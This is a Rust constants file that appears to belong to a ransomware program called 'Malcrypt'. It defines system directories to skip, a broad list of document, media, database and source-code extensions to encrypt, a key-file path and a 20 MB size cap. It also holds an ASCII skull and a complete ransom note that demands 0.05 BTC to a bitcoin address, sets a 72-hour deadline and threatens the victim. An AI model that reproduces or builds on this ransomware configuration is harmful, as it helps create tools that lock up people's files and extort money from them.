pub(crate) const SKIP_DIRS: &[&str] = &[
    "ProgramData",
    "Windows",
    "bootmgr",
    "$WINDOWS.~BT",
    "Windows.old",
    "Temp",
    "tmp",
    "Program Files",
    "Program Files (x86)",
    "AppData",
    "$Recycle.Bin",
];

pub(crate) const ALLOWED_EXTENSIONS: &[&str] = &[
    "doc", "docx", "msg", "odt", "wpd", "wps", "txt", "csv", "pps", "ppt", "pptx", "aif", "iif",
    "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma", "3gp", "3g2", "avi", "flv", "m4v", "mov",
    "mp4", "mpg", "vob", "wmv", "3dm", "3ds", "max", "obj", "blend", "bmp", "gif", "png", "jpeg",
    "jpg", "psd", "tif", "ico", "ai", "eps", "ps", "svg", "pdf", "indd", "pct", "epub", "xls",
    "xlr", "xlsx", "accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db", "dem", "gam", "nes", "rom",
    "sav", "bkp", "bak", "tmp", "cfg", "conf", "ini", "prf", "html", "php", "js", "c", "cc", "py",
    "lua", "go", "java",
];

pub(crate) const KEY_PATH: &str = concat!(env!("PATH_TO_ENCRYPT"), "/mal.mal");

pub(crate) const FILE_SIZE_20_MB: u64 = 20 * 1024 * 1024;

pub(crate) const SKULL: &str = r####"
                       uuuuuuuuuuuuuuuuuuuuu.
                   .u$$$$$$$$$$$$$$$$$$$$$$$$$$W.
                 u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Wu.
               $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i
              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
         `    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
           .i$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i
           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$W
          .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$W
         .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i
         #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$.
         W$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$u       #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$~
$#      `"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$i        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$.        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
 $$      $iW$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!
 $$i      $$$$$$$#"" `"""#$$$$$$$$$$$$$$$$$#""""""#$$$$$$$$$$$$$$$W
 #$$W    `$$$#"            "       !$$$$$`           `"#$$$$$$$$$$#
  $$$     ``                 ! !iuW$$$$$                 #$$$$$$$#
  #$$    $u                  $   $$$$$$$                  $$$$$$$~
   "#    #$$i.               #   $$$$$$$.                 `$$$$$$
          $$$$$i.                """#$$$$i.               .$$$$#
          $$$$$$$$!         .   `    $$$$$$$$$i           $$$$$
          `$$$$$  $iWW   .uW`        #$$$$$$$$$W.       .$$$$$$#
            "#$$$$$$$$$$$$#`          $$$$$$$$$$$iWiuuuW$$$$$$$$W
               !#""    ""             `$$$$$$$##$$$$$$$$$$$$$$$$
          i$$$$    .                   !$$$$$$ .$$$$$$$$$$$$$$$#
         $$$$$$$$$$`                    $$$$$$$$$Wi$$$$$$#"#$$`
         #$$$$$$$$$W.                   $$$$$$$$$$$#   ``
          `$$$$##$$$$!       i$u.  $. .i$$$$$$$$$#""
             "     `#W       $$$$$$$$$$$$$$$$$$$`      u$#
                            W$$$$$$$$$$$$$$$$$$      $$$$W
                            $$`!$$$##$$$$``$$$$      $$$$!
                           i$" $$$$  $$#"`  """     W$$$$
                                                   W$$$$!
                      uW$$  uu  uu.  $$$  $$$Wu#   $$$$$$
                     ~$$$$iu$$iu$$$uW$$! $$$$$$i .W$$$$$$
             ..  !   "#$$$$$$$$$$##$$$$$$$$$$$$$$$$$$$$#"
             $$W  $     "#$$$$$$$iW$$$$$$$$$$$$$$$$$$$$$W
             $#`   `       ""#$$$$$$$$$$$$$$$$$$$$$$$$$$$
                              !$$$$$$$$$$$$$$$$$$$$$#`
                              $$$$$$$$$$$$$$$$$$$$$$!
                            $$$$$$$$$$$$$$$$$$$$$$$`
                             $$$$$$$$$$$$$$$$$$$$"
"####;

pub(super) const ENCRYPTION_NOTE: &str = r#"
Your files have been encrypted by Malcrypt.

All your important files have been encrypted, including documents, photos, videos, and databases. 
To retrieve your files, you must pay a ransom of 0.05 BTC to the following address:
1Ez69SnzzmePmZX3WpEzMKTrcBF2gpNQ55

Failure to pay the ransom within 72 hours will result in the permanent loss of your files.
We will delete your decryption key, and you will never be able to access your files again.

To unlock your files, follow these steps:
1. Obtain the exact amount of Bitcoin (0.05 BTC).
2. Send the Bitcoin to the provided address.
3. Contact us with proof of payment at: decrypt@malcrypt.com

After verification of your payment, we will provide you with the decryption key.

Do not attempt to decrypt your files using third-party software or services. 
Any such attempts will result in the destruction of your files, and we will not provide any assistance.

Remember, we are monitoring all activities on your system. 
Any attempts to remove this software or interfere with the decryption process will lead to severe consequences.

Your only option is to comply with our demands.

Good luck.

MALCRYPT
"#;
